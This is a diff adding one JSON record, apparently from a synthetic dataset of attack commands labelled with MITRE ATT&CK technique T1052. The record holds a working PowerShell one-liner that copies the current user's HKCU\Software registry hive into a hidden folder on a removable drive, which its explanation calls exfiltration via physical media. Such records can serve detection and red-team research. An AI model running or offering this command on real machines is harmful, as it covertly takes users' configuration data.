@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\$env:USERNAME.data\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h $dest; reg.exe export HKCU\\Software \"$dest\\hkcu.reg\" /y > \"$dest\\reg.log\"; Write-Output \"Exported HKCU to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Exports the current user registry hive to a removable drive, useful for offline analysis or exfiltration via physical media.",
+  "rationale_steps": [
+    "Identify removable drive and create hidden destination",
+    "Export HKCU\\Software registry hive to a file on USB",
+    "Write an operation log using Write-Output",
+    "Keep all actions local without network usage"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-782ac129",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
